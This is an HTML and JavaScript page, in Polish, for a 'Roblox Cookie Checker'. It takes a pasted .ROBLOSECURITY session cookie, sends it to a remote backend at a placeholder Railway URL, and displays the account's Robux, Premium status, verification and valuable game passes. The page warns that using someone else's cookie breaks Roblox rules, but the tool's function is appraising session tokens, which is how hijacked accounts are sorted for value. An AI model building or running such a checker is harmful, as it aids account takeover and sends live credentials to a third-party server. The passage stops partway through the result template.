<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox Cookie Checker</title>
  <style>
    :root {
      --bg: #0f0f1a;
      --card: #1a1a2e;
      --text: #e0e0ff;
      --accent: #00d4ff;
      --success: #00ff9d;
      --warning: #ffcc00;
      --danger: #ff4d4d;
    }

    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Segoe UI', system-ui, sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      padding: 2rem 1rem;
      line-height: 1.6;
    }

    .container {
      max-width: 640px;
      margin: 0 auto;
    }

    h1 {
      text-align: center;
      color: var(--accent);
      margin-bottom: 1.5rem;
      font-size: 2.1rem;
    }

    .warning {
      background: rgba(255, 76, 76, 0.12);
      border: 1px solid #ff4d4d66;
      color: #ff9999;
      padding: 1rem;
      border-radius: 8px;
      margin-bottom: 1.5rem;
      text-align: center;
      font-weight: 500;
    }

    textarea {
      width: 100%;
      min-height: 140px;
      background: #111827;
      color: #d1d5db;
      border: 1px solid #374151;
      border-radius: 8px;
      padding: 1rem;
      font-family: 'Consolas', 'Courier New', monospace;
      font-size: 0.95rem;
      resize: vertical;
      margin-bottom: 1rem;
    }

    textarea:focus {
      outline: none;
      border-color: var(--accent);
      box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.15);
    }

    button {
      width: 100%;
      padding: 1rem;
      background: linear-gradient(90deg, #00b4ff, #0095ff);
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 1.1rem;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
    }

    button:hover {
      background: linear-gradient(90deg, #0095ff, #0077ff);
      transform: translateY(-1px);
    }

    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    #result {
      margin-top: 2rem;
      background: var(--card);
      border: 1px solid #2d3748;
      border-radius: 12px;
      padding: 1.5rem;
      min-height: 200px;
      display: none;
    }

    #result.show { display: block; }

    .avatar-container {
      text-align: center;
      margin: 1.2rem 0;
    }

    #avatar {
      max-width: 180px;
      border-radius: 50%;
      border: 4px solid #2d3748;
      box-shadow: 0 8px 16px rgba(0,0,0,0.4);
    }

    .field {
      margin: 0.9rem 0;
      padding: 0.6rem 0;
      border-bottom: 1px solid #2d3748;
    }

    .field:last-child { border-bottom: none; }

    .label {
      color: #a0aec0;
      font-weight: 500;
      display: inline-block;
      min-width: 140px;
    }

    .value {
      font-weight: 600;
    }

    .yes { color: var(--success); }
    .no  { color: var(--danger); }
    .robux { color: var(--warning); font-weight: bold; }

    .loading {
      text-align: center;
      color: #60a5fa;
      font-style: italic;
      margin: 2rem 0;
    }

    .error {
      color: var(--danger);
      text-align: center;
      padding: 1.5rem;
      background: rgba(255,77,77,0.1);
      border-radius: 8px;
    }

    footer {
      text-align: center;
      margin-top: 3rem;
      color: #64748b;
      font-size: 0.85rem;
    }
  </style>
</head>
<body>

<div class="container">
  <h1>Roblox Cookie Checker</h1>

  <div class="warning">
    ⚠️ Używanie cudzego .ROBLOSECURITY narusza regulamin Roblox i może skutkować <strong>permanentnym banem</strong> konta.
  </div>

  <textarea id="cookie" placeholder="Wklej samą wartość .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>

  <button id="btnCheck">Sprawdź konto</button>

  <div id="result">
    <div class="loading" id="loading">Sprawdzam konto... proszę czekać</div>
    <div id="content"></div>
  </div>

  <footer>
    Tylko do użytku własnego • Nie udostępniaj swoich ciasteczek • 2025–2026
  </footer>
</div>

<script>
const btn = document.getElementById('btnCheck');
const cookieInput = document.getElementById('cookie');
const resultDiv = document.getElementById('result');
const contentDiv = document.getElementById('content');
const loadingDiv = document.getElementById('loading');

async function checkAccount() {
  const cookie = cookieInput.value.trim();
  if (cookie.length < 180) {
    showError("Cookie jest za krótkie lub puste");
    return;
  }

  btn.disabled = true;
  resultDiv.classList.add('show');
  loadingDiv.style.display = 'block';
  contentDiv.innerHTML = '';

  try {
    const res = await fetch('https://TWÓJ-URL-RAILWAY.up.railway.app/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie })
    });

    if (!res.ok) throw new Error(`Błąd serwera: ${res.status}`);

    const data = await res.json();

    if (data.error) {
      showError(data.error);
      return;
    }

    if (!data.success) {
      showError("Nie udało się zweryfikować konta");
      return;
    }

    const creation = data.created !== 'failed to fetch'
      ? new Date(data.created).toLocaleDateString('pl-PL', {
          day: 'numeric', month: 'long', year: 'numeric'
        })
      : '—';

    const avatar = data.avatarUrl
      ? `<img id="avatar" src="${data.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/180?text=?'">`
      : '<p style="color:#f87171;">Brak avatara</p>';

    const mm2 = [429957, 1308795].filter(id => data.hasGamePasses?.includes(id)).length;
    const amp = [189425850,951065968,951441773,6408694,60406961585546290,7124470,6965379,3196348,5300198].filter(id => data.hasGamePasses?.includes(id)).length;
    const sab = [1227013099,1229510262,1228591447].filter(id => data.hasGamePasses?.includes(id)).length;

    contentDiv.innerHTML = `
      <div class="avatar-container">${avatar}</div>

      <div class="field"><span class="label">Nick:</span> <span class="value">${data.username}</span></div>
      <div class="field"><span class="label">Display Name:</span> <span class="value">${data.displayName}</span></div>
      <div class="field"><span class="label">User ID:</span> <span class="value">${data.userId}</span></div>

      <div class="field">
        <span class="label">Premium:</span>
        <span class="value ${data.hasPremium ? 'yes' : 'no'}">${data.hasPremium ? 'TAK ✓' : 'NIE ✗'}</span>
      </div>

      <div class="field">
        <span class="label">Email/Phone:</span>
        <span class="value ${data.emailVerified ? 'yes' : 'no'}">${data.emailVerified ? 'Zweryfikowany ✓' : 'Nie zweryfikowany ✗'}</span>
      </div>

      <div class="field">
        <span class="label">Robux:</span>
        <span class="value robux">${data.robux.toLocaleString('pl-PL')} Robux</span>
      </div>

      <div class="field">
